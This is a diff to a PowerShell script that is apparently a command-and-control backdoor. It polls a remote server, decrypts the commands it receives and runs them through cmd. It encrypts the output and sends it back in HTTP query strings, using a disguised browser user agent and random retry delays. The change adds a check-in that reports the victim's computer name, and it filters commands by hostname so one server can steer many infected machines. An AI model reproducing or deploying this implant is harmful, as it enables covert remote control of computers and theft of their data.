@@ -81,6 +81,31 @@ function random_interval {
 }
 while ($True) {
     $time = random_interval
+
+    try {
+            $HOSTNAME = "magic_hostname=$env:computername"
+            $SEND = Encrypt-String $key $HOSTNAME
+            $s = [System.Text.Encoding]::UTF8.GetBytes($SEND)
+            $SEND = [System.Convert]::ToBase64String($s)
+            $r = [System.Net.HTTPWebRequest]::Create($SITE_URL+$SITE_PATH_QUERY+"?"+$QUERY_STRING+$SEND)
+            $r.Method = "GET"
+            $r.KeepAlive = $false
+            $r.UserAgent = "Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko"
+            $r.Headers.Add("Accept-Encoding", "identity");
+            $resp = $r.GetResponse()
+            break 
+    }
+    
+    catch [System.Management.Automation.MethodInvocationException] {
+        Write-Host "[*] Cannot connect to '$SITE_URL'" -Foreground Red
+        Write-Host "[*] Trying again in $time seconds..." -Foreground Yellow
+        sleep $time
+        Continue
+        }
+    }
+
+while ($True) {
+    $time = random_interval
     try {
         $r = [System.Net.HTTPWebRequest]::Create($SITE_URL + $ROOT_PATH_QUERY)
         $r.Method = "GET"
@@ -98,19 +123,24 @@ while ($True) {
         if ($DECRYPTED -eq "nothing"){
             sleep $time
         }
-        else{
-            $RUN = (cmd /Q /c $DECRYPTED 2>&1 ) | Out-String
-            $SEND = Encrypt-String $key $RUN
-            $s = [System.Text.Encoding]::UTF8.GetBytes($SEND)
-            $SEND = [System.Convert]::ToBase64String($s)
-            $r = [System.Net.HTTPWebRequest]::Create($SITE_URL+$SITE_PATH_QUERY+"?"+$QUERY_STRING+$SEND)
-            $r.Method = "GET"
-            $r.KeepAlive = $false
-            $r.UserAgent = "Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko"
-            $r.Headers.Add("Accept-Encoding", "identity");
-            $resp = $r.GetResponse()
-            sleep $time
-        }
+        else{ 
+            if ($DECRYPTED -like $env:computername + "*"){
+                $DECRYPTED = $DECRYPTED -split($env:computername + "::::")
+                $RUN = (cmd /Q /c $DECRYPTED 2>&1 ) | Out-String
+                $RUN = ($env:computername + "::::" + $RUN)
+                $SEND = Encrypt-String $key $RUN
+                $s = [System.Text.Encoding]::UTF8.GetBytes($SEND)
+                $SEND = [System.Convert]::ToBase64String($s)
+                $r = [System.Net.HTTPWebRequest]::Create($SITE_URL+$SITE_PATH_QUERY+"?"+$QUERY_STRING+$SEND)
+                $r.Method = "GET"
+                $r.KeepAlive = $false
+                $r.UserAgent = "Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko"
+                $r.Headers.Add("Accept-Encoding", "identity");
+                $resp = $r.GetResponse()
+                sleep $time
+
+                }
+            }
     }
     catch [System.Management.Automation.MethodInvocationException] {
         Write-Host "[*] Cannot connect to '$SITE_URL'" -Foreground Red
